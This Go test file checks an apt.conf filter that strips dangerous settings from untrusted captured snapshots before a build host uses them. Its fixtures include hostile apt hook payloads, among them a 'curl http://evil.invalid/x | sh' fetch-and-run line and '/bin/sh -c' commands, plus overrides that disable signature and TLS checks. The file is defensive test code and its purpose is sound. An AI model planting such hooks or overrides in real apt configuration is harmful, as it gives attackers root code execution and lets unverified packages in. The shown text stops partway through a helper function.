package apt

import (
	"strings"
	"testing"
)

func mustFilter(t *testing.T, content string, allowProxy bool) (string, []DroppedConfEntry) {
	t.Helper()
	out, dropped := filterAptConf("etc/apt/apt.conf.d/99test", []byte(content), allowProxy)
	return string(out), dropped
}

func TestFilterAptConf_PassesAllowListedScalar(t *testing.T) {
	out, dropped := mustFilter(t, `Acquire::Languages "none";`, false)
	if len(dropped) != 0 {
		t.Fatalf("unexpected drops: %+v", dropped)
	}
	if !strings.Contains(out, `Acquire::Languages "none";`) {
		t.Fatalf("output missing the setting: %s", out)
	}
}

func TestFilterAptConf_DropsScalarDir(t *testing.T) {
	// The exact shape Docker's own apt.conf.d/docker-clean ships, which is
	// exactly why this drop rule exists: a captured apt.conf.d can contain a
	// live Dir override.
	in := "Dir::Cache::pkgcache \"\";\nDir::Cache::srcpkgcache \"\";\nAcquire::Languages \"none\";\n"
	out, dropped := mustFilter(t, in, false)
	if len(dropped) != 2 {
		t.Fatalf("expected 2 dropped entries, got %+v", dropped)
	}
	for _, d := range dropped {
		if !strings.HasPrefix(d.Key, "Dir::Cache::") {
			t.Errorf("dropped entry has unexpected key %q", d.Key)
		}
		if d.File != "etc/apt/apt.conf.d/99test" {
			t.Errorf("dropped entry has unexpected file %q", d.File)
		}
		// The allow-list would withhold a Dir key anyway; the reason is what
		// pins the rule that says a private root sets its own paths.
		if !strings.Contains(d.Reason, "Dir override") {
			t.Errorf("%s dropped for the wrong reason: %q", d.Key, d.Reason)
		}
	}
	if strings.Contains(out, "pkgcache") || strings.Contains(out, "srcpkgcache") {
		t.Fatalf("output still contains a Dir setting: %s", out)
	}
	if !strings.Contains(out, `Acquire::Languages "none";`) {
		t.Fatalf("unrelated setting was dropped too: %s", out)
	}
}

func TestFilterAptConf_DropsNestedDirBlock(t *testing.T) {
	in := `Dir {
	Cache {
		archives "/should/not/survive";
	};
};
APT::Install-Recommends "true";
`
	out, dropped := mustFilter(t, in, false)
	if len(dropped) != 1 || dropped[0].Key != "Dir" {
		t.Fatalf("expected one drop of the whole Dir block, got %+v", dropped)
	}
	if strings.Contains(out, "should/not/survive") {
		t.Fatalf("nested Dir block leaked through: %s", out)
	}
	if !strings.Contains(out, `APT::Install-Recommends "true";`) {
		t.Fatalf("unrelated setting was dropped too: %s", out)
	}
}

func TestFilterAptConf_ProxyDroppedByDefaultKeptWhenAllowed(t *testing.T) {
	in := `Acquire::http::Proxy "http://builder-proxy.example:3128";`

	out, dropped := mustFilter(t, in, false)
	if len(dropped) != 1 || dropped[0].Key != "Acquire::http::Proxy" {
		t.Fatalf("expected the proxy setting to be dropped, got %+v", dropped)
	}
	if strings.Contains(out, "builder-proxy") {
		t.Fatalf("proxy value leaked through despite allowProxy=false: %s", out)
	}

	out2, dropped2 := mustFilter(t, in, true)
	if len(dropped2) != 0 {
		t.Fatalf("expected nothing dropped with allowProxy=true, got %+v", dropped2)
	}
	if !strings.Contains(out2, "builder-proxy") {
		t.Fatalf("proxy value missing despite allowProxy=true: %s", out2)
	}
}

// TestFilterAptConf_ProxyDroppedInNestedBlock pins the block form of the
// proxy family in both modes. Under the allow-list the two modes take
// different routes to the same answer, and both are worth holding: with no
// opt-in, nothing under Acquire::http is on the allow-list, so the whole
// block goes as one recorded entry; with the opt-in, the block is descended
// so the proxy inside it can be reached, and its non-resolution sibling is
// still dropped on its own.
func TestFilterAptConf_ProxyDroppedInNestedBlock(t *testing.T) {
	in := `Acquire::http {
	Proxy "http://builder-proxy.example:3128";
	Pipeline-Depth "0";
};`
	out, dropped := mustFilter(t, in, false)
	if len(dropped) != 1 || dropped[0].Key != "Acquire::http" {
		t.Fatalf("expected the whole non-allow-listed block to be dropped as one entry, got %+v", dropped)
	}
	if strings.Contains(out, "builder-proxy") {
		t.Fatalf("proxy value leaked through: %s", out)
	}

	out2, dropped2 := mustFilter(t, in, true)
	if len(dropped2) != 1 || dropped2[0].Key != "Acquire::http::Pipeline-Depth" {
		t.Fatalf("expected only the non-resolution sibling to be dropped with allowProxy=true, got %+v", dropped2)
	}
	if !strings.Contains(out2, "builder-proxy") {
		t.Fatalf("opted-in proxy did not survive in block form: %s", out2)
	}
	if strings.Contains(out2, "Pipeline-Depth") {
		t.Fatalf("network tuning is not a resolution setting and must not survive: %s", out2)
	}
}

// TestFilterAptConf_ProxyPerHostFormDropped covers a form the deny-list this
// change replaces let straight through: apt spells a per-host proxy
// Acquire::http::Proxy::<host>, whose FINAL segment is a hostname, so the old
// "final segment is Proxy" rule never matched it. The allow-list drops it
// because nothing under Acquire::http is allowed at all, and the proxy rule
// now matches any Proxy segment, so it is reported as the proxy setting it is
// rather than as an unrecognised key.
func TestFilterAptConf_ProxyPerHostFormDropped(t *testing.T) {
	in := `Acquire::http::Proxy::mirror.example.com "http://builder-proxy.example:3128";`

	out, dropped := mustFilter(t, in, false)
	if len(dropped) != 1 {
		t.Fatalf("expected the per-host proxy form to be dropped, got %+v", dropped)
	}
	if !strings.Contains(dropped[0].Reason, "proxy setting") {
		t.Errorf("per-host proxy dropped for the wrong reason: %+v", dropped[0])
	}
	if strings.Contains(out, "builder-proxy") {
		t.Fatalf("per-host proxy value leaked through: %s", out)
	}

	out2, dropped2 := mustFilter(t, in, true)
	if len(dropped2) != 0 {
		t.Fatalf("expected nothing dropped with allowProxy=true, got %+v", dropped2)
	}
	if !strings.Contains(out2, "builder-proxy") {
		t.Fatalf("opted-in per-host proxy did not survive: %s", out2)
	}
}

// TestFilterAptConf_PreservesBareValueListBlock covers the parser/serializer
// path for a list-valued key: the bare values inside a block have no key of
// their own and are filtered at their parent. The key here is on the
// allow-list (a multi-arch target's real APT::Architectures), which is now
// what makes the block survive at all.
func TestFilterAptConf_PreservesBareValueListBlock(t *testing.T) {
	in := `APT::Architectures {
	"amd64";
	"i386";
};`
	out, dropped := mustFilter(t, in, false)
	if len(dropped) != 0 {
		t.Fatalf("unexpected drops: %+v", dropped)
	}
	if !strings.Contains(out, `"amd64"`) || !strings.Contains(out, `"i386"`) {
		t.Fatalf("bare values in a list block were lost: %s", out)
	}
}

// TestFilterAptConf_PreservesAllowedNestedBlock is the block form of the
// allow-list: apt treats "APT { Install-Recommends "false"; };" as identical
// to the dotted form, and so must this filter, or the same target setting
// survives or dies depending on which shape the target's admin happened to
// write. The first fixture is byte-shaped like
// core/snapshot/testdata/recommends-false/etc/apt/apt.conf.d/99recommends;
// the second goes one level deeper, to a list inside a block.
func TestFilterAptConf_PreservesAllowedNestedBlock(t *testing.T) {
	in := `APT
{
  Install-Recommends "false";
  Default-Release "bookworm";
};
`
	out, dropped := mustFilter(t, in, false)
	if len(dropped) != 0 {
		t.Fatalf("unexpected drops: %+v", dropped)
	}
	for _, want := range []string{"Install-Recommends", "Default-Release", "bookworm"} {
		if !strings.Contains(out, want) {
			t.Errorf("%s was lost from the nested block form: %s", want, out)
		}
	}

	deep := `Acquire
{
  Languages
  {
     "en";
     "none";
  };
};
`
	out2, dropped2 := mustFilter(t, deep, false)
	if len(dropped2) != 0 {
		t.Fatalf("unexpected drops: %+v", dropped2)
	}
	if !strings.Contains(out2, `"en"`) || !strings.Contains(out2, `"none"`) {
		t.Fatalf("list inside a nested allowed block was lost: %s", out2)
	}
}

// TestFilterAptConf_StripsCommentsAndDirectives covers both "#" directives
// apt defines. #include names a path that exists on the target and not on the
// builder; #clear subtracts configuration, which under an allow-list could
// only ever subtract something the allow-list had already decided to carry.
// Both are dropped AND recorded — a directive that vanished with no warning
// would be exactly the silent fidelity loss this design refuses.
//
// A "#" line that is neither is a comment, and must NOT be recorded. That is
// not tidiness: a real lock from a stock Docker target carried 34 such
// warnings, all keyed "#", against five that actually mattered, and the
// report is the whole mitigation for what this filter withholds. The comment
// forms below are the ones Docker's own captured apt.conf.d files use.
func TestFilterAptConf_StripsCommentsAndDirectives(t *testing.T) {
	in := "// a comment\n" +
		"# a hash comment, as Docker's own apt.conf.d files open with\n" +
		"#\n" +
		"#include \"/etc/apt/apt.conf.d/nonexistent-on-builder\";\n" +
		"#clear APT::Install-Recommends;\n" +
		"APT::Install-Recommends \"false\"; // trailing comment\n"
	out, dropped := mustFilter(t, in, false)
	if len(dropped) != 2 {
		t.Fatalf("expected exactly the two real directives to be recorded, and no comment; got %+v", dropped)
	}
	for _, d := range dropped {
		if d.Key == "#" {
			t.Errorf("a comment line was reported as a withheld setting: %+v", d)
		}
	}
	gotKeys := []string{dropped[0].Key, dropped[1].Key}
	for i, want := range []string{"#include", "#clear"} {
		if gotKeys[i] != want {
			t.Errorf("dropped[%d].Key = %q, want %q (all of %+v)", i, gotKeys[i], want, dropped)
		}
	}
	if strings.Contains(out, "nonexistent-on-builder") {
		t.Fatalf("#include target leaked through: %s", out)
	}
	if strings.Contains(out, "#clear") {
		t.Fatalf("#clear directive leaked through: %s", out)
	}
	if strings.Contains(out, "a comment") || strings.Contains(out, "trailing comment") {
		t.Fatalf("comment text leaked through: %s", out)
	}
	if !strings.Contains(out, `APT::Install-Recommends "false";`) {
		t.Fatalf("setting after the comment was lost: %s", out)
	}
}

// TestFilterAptConf_DockerCleanReportsOnlyRealSettings is the signal-to-noise
// property on a real file. The shape below is reconstructed from a real lock
// built against a stock Docker target, whose warning inventory for the
// captured etc/apt/apt.conf.d/docker-clean was: 12 entries keyed "#", plus
// Dir::Cache::pkgcache, Dir::Cache::srcpkgcache, DPkg::Post-Invoke and
// APT::Update::Post-Invoke. (The comment prose is illustrative; the counts
// and the four real keys are not.) Sixteen warnings, of which four said
// anything — and the four that did include two command hooks, which is the
// class of finding an operator most needs to see.
//
// The assertion is that this file now yields exactly those four. A filter
// that reports everything it discards is not more honest than one that
// reports what it withheld; it is less useful, because the report is the only
// mitigation the allow-list offers for the fidelity it costs.
func TestFilterAptConf_DockerCleanReportsOnlyRealSettings(t *testing.T) {
	in := `# Since for most Docker users, package installs happen in "docker build"
# steps, they essentially become individual layers due to the way Docker
# handles layering, especially using CoW filesystems. What this means for us
# is that the caches that APT keeps end up just wasting space in those layers.
#
# Ideally, these would just be invoking "apt-get clean", but in our testing,
# that ended up being cyclic and we got stuck on APT's lock, so we get this
# fun creation that's essentially just "apt-get clean".
DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb || true"; };
APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb || true"; };

Dir::Cache::pkgcache "";
Dir::Cache::srcpkgcache "";

# Note that we do realize this isn't the ideal way to do this, and are
# always open to better suggestions.
`
	out, dropped := mustFilter(t, in, false)
	if strings.TrimSpace(out) != "" {
		t.Errorf("nothing in docker-clean belongs in a private root, got: %q", out)
	}
	want := map[string]string{
		"DPkg::Post-Invoke":        "command hook",
		"APT::Update::Post-Invoke": "command hook",
		"Dir::Cache::pkgcache":     "Dir override",
		"Dir::Cache::srcpkgcache":  "Dir override",
	}
	if len(dropped) != len(want) {
		t.Fatalf("expected exactly %d warnings, one per real setting; got %d: %+v", len(want), len(dropped), dropped)
	}
	for _, d := range dropped {
		reason, ok := want[d.Key]
		if !ok {
			t.Errorf("unexpected warning for %q: %+v", d.Key, d)
			continue
		}
		if !strings.Contains(d.Reason, reason) {
			t.Errorf("%s reported as %q, want it to mention %q", d.Key, d.Reason, reason)
		}
		delete(want, d.Key)
	}
	for k := range want {
		t.Errorf("no warning named %q, so it was withheld silently", k)
	}
}

func TestFilterAptConf_PreservesListAppendSyntax(t *testing.T) {
	in := "APT::Architectures:: \"amd64\";\nAPT::Architectures:: \"arm64\";\n"
	out, dropped := mustFilter(t, in, false)
	if len(dropped) != 0 {
		t.Fatalf("unexpected drops: %+v", dropped)
	}
	if strings.Count(out, "APT::Architectures::") != 2 {
		t.Fatalf("expected both append entries preserved: %s", out)
	}
	if !strings.Contains(out, `"amd64"`) || !strings.Contains(out, `"arm64"`) {
		t.Fatalf("append values missing: %s", out)
	}
}

func TestFilterAptConf_RoundTripsThroughOwnParser(t *testing.T) {
	// The filtered output must itself be valid apt.conf syntax: parse it
	// again and check the surviving/removed keys are exactly as expected.
	in := `Dir::Cache::archives "/tmp/x";
Acquire::http::Proxy "http://p:3128";
Acquire::Languages "none";
APT::Install-Recommends "true";
`
	out, _ := mustFilter(t, in, false)
	toks := tokenizeAptConf([]byte(out))
	pos := 0
	items := parseAptConfItems(toks, &pos)
	var keys []string
	var walk func([]confItem, string)
	walk = func(items []confItem, prefix string) {
		for _, it := range items {
			if it.Key == "" {
				continue
			}
			full := strings.TrimSuffix(it.Key, "::")
			if prefix != "" {
				full = prefix + "::" + full
			}
			if it.IsBlock {
				walk(it.Block, full)
			} else {
				keys = append(keys, full)
			}
		}
	}
	walk(items, "")
	want := map[string]bool{"Acquire::Languages": true, "APT::Install-Recommends": true}
	got := map[string]bool{}
	for _, k := range keys {
		got[k] = true
	}
	for k := range want {
		if !got[k] {
			t.Errorf("round-tripped output missing %q; keys = %v", k, keys)
		}
	}
	for _, bad := range []string{"Dir::Cache::archives", "Acquire::http::Proxy"} {
		if got[bad] {
			t.Errorf("round-tripped output still has %q, should have been dropped", bad)
		}
	}
}

// TestFilterAptConf_DropsCommandHooks covers the keys apt EXECUTES rather
// than reads. The first case is the exact payload that was confirmed to run
// against apt 2.6.1 in a container: the hook fired as root and `apt-get
// update` still exited 0, so nothing downstream would have noticed. A
// snapshot is untrusted input, so carrying any of these into the private
// root is arbitrary code execution on the builder - the one host holding a
// signing key.
// The reason assertions matter as much as the drop assertions now. Under an
// allow-list every one of these would be dropped anyway, as an unrecognised
// key — so without checking the reason, this test would keep passing with the
// hook rules deleted, and the operator would be told a hook was "not on the
// allow-list" rather than that their snapshot tried to run a program on the
// builder. The rules and the words they produce are the thing under test.
func TestFilterAptConf_DropsCommandHooks(t *testing.T) {
	cases := []struct{ name, in, reason string }{
		{"update pre-invoke", `APT::Update::Pre-Invoke { "/bin/sh -c 'id > /tmp/pwned'"; };`, "command hook"},
		{"update post-invoke", `APT::Update::Post-Invoke { "curl http://evil.invalid/x | sh"; };`, "command hook"},
		{"post-invoke-success", `APT::Update::Post-Invoke-Success { "/tmp/evil"; };`, "command hook"},
		{"dpkg pre-install-pkgs", `DPkg::Pre-Install-Pkgs { "/tmp/evil"; };`, "command hook"},
		{"proxy auto detect", `Acquire::http::Proxy-Auto-Detect "/tmp/evil-detect";`, "command hook"},
		{"dpkg tools subtree", `DPkg::Tools::Options::/tmp/evil "--run";`, "DPkg::Tools subtree"},
		{"gpgv options", `Acquire::gpgv::Options { "--fake-arg"; };`, "gpgv options"},
		// A scoped re-entry must not slip past a rule that only looked at
		// the first segment: apt applies Binary::<prog>:: overrides to the
		// named program, so this is the same hook by another path.
		{"scoped re-entry", `Binary::apt-get::DPkg::Pre-Invoke { "/tmp/evil"; };`, "command hook"},
		// apt config keys are case-insensitive; the filter must be too.
		{"case insensitive", `APT::Update::pre-invoke { "/tmp/evil"; };`, "command hook"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out, dropped := mustFilter(t, c.in, false)
			if len(dropped) == 0 {
				t.Fatalf("hook was NOT dropped; it would reach the private root.\ninput:  %s\noutput: %s", c.in, out)
			}
			if !strings.Contains(dropped[0].Reason, c.reason) {
				t.Errorf("dropped for the wrong reason: got %q, want it to mention %q", dropped[0].Reason, c.reason)
			}
			for _, bad := range []string{"evil", "pwned", "curl", "fake-arg"} {
				if strings.Contains(out, bad) {
					t.Errorf("payload %q survived into the filtered output: %s", bad, out)
				}
			}
		})
	}
}

// TestFilterAptConf_DropsVerificationOverrides covers the second, independent
// consequence of the same passthrough: a snapshot that switches apt's own
// signature and freshness checking off on the BUILDER, where packages are
// actually fetched over the network.
func TestFilterAptConf_DropsVerificationOverrides(t *testing.T) {
	in := strings.Join([]string{
		`APT::Get::AllowUnauthenticated "true";`,
		`Acquire::AllowInsecureRepositories "true";`,
		`Acquire::AllowDowngradeToInsecureRepositories "true";`,
		`Acquire::AllowWeakRepositories "true";`,
		`Acquire::Check-Valid-Until "false";`,
		`Acquire::Check-Date "false";`,
		`Acquire::https::Verify-Peer "false";`,
		`Acquire::https::Verify-Host "false";`,
		`Binary::apt-get::APT::Get::AllowUnauthenticated "true";`,
	}, "\n")
	out, dropped := mustFilter(t, in, false)
	if len(dropped) != 9 {
		t.Fatalf("dropped %d of 9 verification overrides: %+v", len(dropped), dropped)
	}
	// As with the hooks: the allow-list would drop all nine anyway, so the
	// reason is what pins the rule that exists to explain them.
	for _, d := range dropped {
		if !strings.Contains(d.Reason, "verification override") {
			t.Errorf("%s dropped for the wrong reason: %q", d.Key, d.Reason)
		}
	}
	for _, bad := range []string{"AllowUnauthenticated", "AllowInsecure", "AllowDowngrade", "AllowWeak", "Check-Valid-Until", "Check-Date", "Verify-Peer", "Verify-Host"} {
		if strings.Contains(out, bad) {
			t.Errorf("%s survived into the filtered output: %s", bad, out)
		}
	}
}

// TestFilterAptConf_KeepsResolutionFidelityKeys is the other half of the
// rule: the filter exists to protect the builder, not to sanitise away the
// target's actual apt behaviour. These keys change what apt RESOLVES and
// must survive, or the bundle stops matching the target.
func TestFilterAptConf_KeepsResolutionFidelityKeys(t *testing.T) {
	in := strings.Join([]string{
		`APT::Install-Recommends "false";`,
		`APT::Install-Suggests "false";`,
		`APT::Solver "3.0";`,
		`APT::Default-Release "stable";`,
		`Acquire::Languages "none";`,
		`APT::Architectures { "amd64"; "i386"; };`,
		// The rest of the allow-list, added with it: APT::Architecture
		// (which architecture has candidates at all), the phasing trio E1
		// measured flipping a real package between selected and kept back,
		// and solver3's own tuning keys, which live under APT::Solver and
		// have to travel with it.
		`APT::Architecture "amd64";`,
		`APT::Machine-ID "eea43cf0d2a04d9f9d1f2f8e4b0c1a35";`,
		`APT::Get::Never-Include-Phased-Updates "true";`,
		`APT::Get::Always-Include-Phased-Updates "false";`,
		`APT::Solver::RemoveManual "true";`,
	}, "\n")
	out, dropped := mustFilter(t, in, false)
	if len(dropped) != 0 {
		t.Fatalf("resolution-fidelity keys were dropped: %+v", dropped)
	}
	for _, want := range []string{
		"Install-Recommends", "Install-Suggests", "Solver", "Default-Release",
		"Languages", "Architectures", "APT::Architecture ", "Machine-ID",
		"Never-Include-Phased-Updates", "Always-Include-Phased-Updates",
		"Solver::RemoveManual",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("%s did not survive the filter: %s", want, out)
		}
	}
}

// TestFilterAptConf_AllowListIsExactExceptTheSolverSubtree pins the matching
// rule itself. Nine of the ten allow-list entries name a scalar or a value
// list, so nothing is legal beneath them and a captured path that runs deeper
// is a key the list never anticipated — it must be dropped like any other.
// This is not a hypothetical tightening: matching every entry as a bare path
// prefix, which is what this filter did when the allow-list first landed,
// silently made all ten of them subtree roots, and so re-created the
// fail-open shape the allow-list exists to remove, one level further down.
func TestFilterAptConf_AllowListIsExactExceptTheSolverSubtree(t *testing.T) {
	for _, in := range []string{
		`APT::Install-Recommends::Run-Program "/tmp/evil";`,
		`APT::Machine-ID::Post-Update "/tmp/evil";`,
		`APT::Default-Release::Anything "/tmp/evil";`,
		`Acquire::Languages::Fetch-With "/tmp/evil";`,
		// And through a front-end scope, which is judged as the key it sets.
		`Binary::apt-get::APT::Architectures::Probe "/tmp/evil";`,
	} {
		out, dropped := mustFilter(t, in, false)
		if len(dropped) != 1 {
			t.Fatalf("a key beneath a scalar allow-list entry must be dropped and recorded exactly once; got %+v (input %s)", dropped, in)
		}
		if !strings.Contains(dropped[0].Reason, "allow-list") {
			t.Errorf("drop reason does not tell the operator why: %+v", dropped[0])
		}
		if strings.Contains(out, "evil") {
			t.Errorf("key beneath a scalar allow-list entry survived: %s", out)
		}
	}

	// APT::Solver is the one entry that admits its subtree, and the only one
	// that has earned it: solver3's own tuning keys really do live under it
	// (APT::Solver::RemoveManual, in E2's dump of a stock questing image).
	out, dropped := mustFilter(t, `APT::Solver::RemoveManual "true";`, false)
	if len(dropped) != 0 {
		t.Fatalf("the solver subtree must survive: %+v", dropped)
	}
	if !strings.Contains(out, "RemoveManual") {
		t.Fatalf("solver tuning key was lost: %s", out)
	}
}

// TestFilterAptConf_KeepsScopedResolutionKeys pins apt's per-front-end
// scoping, Binary::<program>::<key>. This is not a hypothetical shape: E2
// recorded a stock Ubuntu questing carrying its solver default as
// binary::apt-get::APT::Solver "3.0" while the bare key was blank, and
// effectiveSolverFromDump reads that scoped key back out of the private root
// by preference. A filter that judged only the first segment would drop the
// target's real solver setting and then report no divergence, because the
// thing it was comparing had been removed on the way in.
func TestFilterAptConf_KeepsScopedResolutionKeys(t *testing.T) {
	flat := `Binary::apt-get::APT::Solver "3.0";
Binary::apt::APT::Install-Recommends "false";
`
	out, dropped := mustFilter(t, flat, false)
	if len(dropped) != 0 {
		t.Fatalf("scoped resolution keys were dropped: %+v", dropped)
	}
	for _, want := range []string{"Binary::apt-get::APT::Solver", `"3.0"`, "Binary::apt::APT::Install-Recommends"} {
		if !strings.Contains(out, want) {
			t.Errorf("%s did not survive the filter: %s", want, out)
		}
	}

	block := `Binary {
	apt-get {
		APT {
			Solver "3.0";
		};
	};
};`
	out2, dropped2 := mustFilter(t, block, false)
	if len(dropped2) != 0 {
		t.Fatalf("scoped resolution key in block form was dropped: %+v", dropped2)
	}
	if !strings.Contains(out2, `"3.0"`) {
		t.Fatalf("scoped solver value lost in block form: %s", out2)
	}
}

// TestFilterAptConf_FailsClosedOnUnknownKeys is the whole point of the
// change, and the one property a deny-list can never assert: a key nobody
// anticipated is dropped because nobody allowed it. Two of these are invented
// outright; the third is invented in the shape of the defect this replaces —
// a plausible future apt release adding one more key that runs a program. A
// deny-list would carry all three into the private root and, for the third,
// straight into a shell.
func TestFilterAptConf_FailsClosedOnUnknownKeys(t *testing.T) {
	cases := []struct{ name, in, payload string }{
		{"invented key under a real prefix", `APT::Frobnicate-Widgets "/tmp/evil";`, "evil"},
		{"invented top-level tree", `Quux::Nonsense::Setting "/tmp/evil";`, "evil"},
		{"invented executable key apt does not have yet", `APT::Update::Post-Fetch-Command "/bin/sh -c 'id > /tmp/pwned'";`, "pwned"},
		{"invented key in block form", `Quux { Nonsense { "/tmp/evil"; }; };`, "evil"},
		// The fully nested spelling of a hook. The hook rules match a final
		// path segment, so they never see this one — the block is dropped
		// whole, at APT::Update, before anything descends far enough to read
		// "Pre-Invoke". Under a deny-list that is a hole; under an allow-list
		// it is simply an unrecognised block, which is the property being
		// asserted: the payload does not reach the private root either way.
		{"nested hook block no rule names", `APT { Update { Pre-Invoke { "/bin/sh -c 'id > /tmp/pwned'"; }; }; };`, "pwned"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out, dropped := mustFilter(t, c.in, false)
			if len(dropped) != 1 {
				t.Fatalf("an unanticipated key must be dropped exactly once and recorded; got %+v\ninput: %s", dropped, c.in)
			}
			if !strings.Contains(dropped[0].Reason, "allow-list") {
				t.Errorf("drop reason does not tell the operator why: %+v", dropped[0])
			}
			if strings.Contains(out, c.payload) {
				t.Errorf("payload %q survived into the filtered output: %s", c.payload, out)
			}
		})
	}
}

// TestFilterAptConf_DropsNonResolutionKeys covers the settings a real target
// really does carry and that this filter now withholds on purpose: they do
// not change what apt selects, so under an allow-list they do not travel.
// Each is the honest cost of the rule, and each produces a warning naming
// itself — which is what makes the cost visible rather than mysterious.
func TestFilterAptConf_DropsNonResolutionKeys(t *testing.T) {
	cases := []struct{ name, in, key string }{
		// Debian's real /etc/apt/apt.conf.d/01autoremove. debark never runs
		// autoremove, so this cannot move a resolution.
		{"autoremove bookkeeping", "APT\n{\n  NeverAutoRemove\n  {\n     \"^firmware-linux.*\";\n  };\n};\n", "APT::NeverAutoRemove"},
		// dpkg front-end behaviour: steers an install, not a selection, and
		// core/install sets its own.
		{"dpkg options", "DPkg::Options {\n\t\"--force-confdef\";\n\t\"--force-confold\";\n};", "DPkg::Options"},
		// Builder network tuning. buildOptions sets Retries itself.
		{"acquire retries", `Acquire::Retries "3";`, "Acquire::Retries"},
		{"acquire timeout", `Acquire::http::Timeout "10";`, "Acquire::http::Timeout"},
		// Unattended-upgrade state has nothing to do with resolving a request.
		{"periodic", `APT::Periodic::Update-Package-Lists "1";`, "APT::Periodic::Update-Package-Lists"},
		// A scope wrapper around a key that is itself not allowed must not
		// smuggle it in.
		{"scoped non-resolution key", `Binary::apt-get::DPkg::Options:: "--force-all";`, "Binary::apt-get::DPkg::Options"},
		// apt's other scoping form. stripBinaryScope unwraps Binary:: only,
		// because that is the shape E2 actually recorded a target carrying;
		// Version:: is apt's own compatibility defaulting, and guessing at a
		// scope this filter has no evidence for is the failing the allow-list
		// exists to end. So it is dropped — and, as always, reported.
		{"version scope", `Version::2.6::APT::Install-Recommends "false";`, "Version::2.6::APT::Install-Recommends"},
		// A container path carrying a value of its own rather than a block.
		// "APT" is kept open only so an allowed key underneath it can be
		// reached; a bare value there sets something apt never reads.
		{"value at a container path", `APT "true";`, "APT"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out, dropped := mustFilter(t, c.in, false)
			if len(dropped) != 1 || dropped[0].Key != c.key {
				t.Fatalf("expected exactly one recorded drop of %q, got %+v", c.key, dropped)
			}
			if strings.TrimSpace(out) != "" {
				t.Errorf("nothing should survive this fixture, got: %q", out)
			}
		})
	}
}

// TestFilterAptConf_PrunesEmptiedContainerBlock checks the one piece of
// bookkeeping the container rule needs: "APT { ... };" is kept open only so
// an allowed key underneath it can be reached, so when every child is dropped
// the wrapper must not be written out as a bare "APT {};" — a key nothing
// carried, in the file apt actually reads.
func TestFilterAptConf_PrunesEmptiedContainerBlock(t *testing.T) {
	in := "APT\n{\n  NeverAutoRemove { \"^firmware-linux.*\"; };\n  Periodic::Enable \"1\";\n};\n"
	out, dropped := mustFilter(t, in, false)
	if len(dropped) != 2 {
		t.Fatalf("expected both children recorded as dropped, got %+v", dropped)
	}
	if strings.TrimSpace(out) != "" {
		t.Fatalf("emptied container block was written out anyway: %q", out)
	}
}

// TestFilterAptConf_DropsSolverValueNamingAProgram guards the one allow-list
// entry whose VALUE apt can turn into an exec: APT::Solver names a helper apt
// looks up under Dir::Bin::solvers and runs (E2 saw apt 2.8.3 refuse "3.0"
// with "Can't call external solver ... not in a configured directory!", which
// is that lookup failing). A real solver name is a bare word, so requiring
// one costs no fidelity.
func TestFilterAptConf_DropsSolverValueNamingAProgram(t *testing.T) {
	for _, in := range []string{
		`APT::Solver "../../../tmp/evil";`,
		`APT::Solver "/tmp/evil";`,
		`Binary::apt-get::APT::Solver "../../../tmp/evil";`,
		`APT::Solver { "../../../tmp/evil"; };`,
	} {
		out, dropped := mustFilter(t, in, false)
		if len(dropped) != 1 {
			t.Fatalf("expected the path-shaped solver value to be dropped, got %+v (input %s)", dropped, in)
		}
		if strings.Contains(out, "evil") {
			t.Errorf("path-shaped solver value survived: %s", out)
		}
	}
	// The real values must still pass, or the guard has cost fidelity.
	for _, in := range []string{`APT::Solver "internal";`, `APT::Solver "3.0";`, `APT::Solver "dump";`} {
		_, dropped := mustFilter(t, in, false)
		if len(dropped) != 0 {
			t.Errorf("a real solver name was dropped: %+v (input %s)", dropped, in)
		}
	}
}

// TestFilterAptConf_EveryDropIsRecorded is the property the whole mitigation
// rests on: the filter may withhold anything it likes, but it may never
// withhold anything quietly. Reporting is what turns "we dropped a setting
// that changed your resolution" from an invisible wrong answer into a line in
// the lock an operator can act on, so this walks a realistic mixed fixture
// and asserts that every key present on the way in is either present on the
// way out or covered by a DroppedConfEntry.
func TestFilterAptConf_EveryDropIsRecorded(t *testing.T) {
	in := strings.Join([]string{
		`Dir::Cache::pkgcache "";`,
		`Acquire::http::Proxy "http://builder-proxy.example:3128";`,
		`APT::Update::Pre-Invoke { "/tmp/evil"; };`,
		`DPkg::Options { "--force-confold"; };`,
		`APT { NeverAutoRemove { "^firmware-linux.*"; }; };`,
		`APT::Install-Recommends "false";`,
		`Acquire::Languages "none";`,
		`Binary::apt-get::APT::Solver "3.0";`,
		`APT::Periodic::Update-Package-Lists "1";`,
		`APT::Frobnicate-Widgets "1";`,
		`#include "/etc/apt/apt.conf.d/nonexistent-on-builder";`,
		`#clear APT::Install-Recommends;`,
	}, "\n")
	out, dropped := mustFilter(t, in, false)

	survived := map[string]bool{}
	for _, k := range confKeysOf(t, out) {
		survived[strings.ToLower(k)] = true
	}
	for _, k := range confKeysOf(t, in) {
		if survived[strings.ToLower(k)] {
			continue
		}
		if !coveredByDrop(k, dropped) {
			t.Errorf("key %q was withheld with no DroppedConfEntry to explain it; dropped = %+v", k, dropped)
		}
	}
	// And the converse sanity check: the fixture really did exercise both
	// outcomes, so a filter that dropped (or kept) everything would not pass
	// this test by vacuum.
	if len(dropped) == 0 || len(survived) == 0 {
		t.Fatalf("fixture no longer exercises both outcomes: %d dropped, %d survived", len(dropped), len(survived))
	}
}

// coveredByDrop reports whether one withheld key is explained by a recorded
// drop: either exactly, or by a drop of a subtree it sits under (a whole
// dropped block is recorded once, at the block).
func coveredByDrop(key string, dropped []DroppedConfEntry) bool {
	for _, d := range dropped {
		if strings.EqualFold(d.Key, key) || strings.HasPrefix(strings.ToLower(key), strings.ToLower(d.Key)+"::") {
			return true
		}
	}
	return false
}

// confKeysOf parses apt.conf text with this package's own parser and returns
// every key it assigns, flattened to dotted paths, plus one entry per "#"
// directive. Bare values inside a list block have no key of their own and are
// covered by their parent.
func confKeysOf(t *testing.T, content string) []string {
	t.Helper()
	toks := tokenizeAptConf([]byte(content))
	pos := 0
	return flattenConfKeys(parseAptConfItems(toks, &pos), "")
}

func flattenConfKeys(items []confItem, prefix string) []string {
	var keys []string
	for _, it := range items {
		if it.Directive != "" {
			// Only apt's two real directives are settings a filter could be
			// said to withhold. Every other "#" line is a comment and has no
			// key, so counting one here would demand a warning for it and
			// re-impose the noise that buried the real drops.
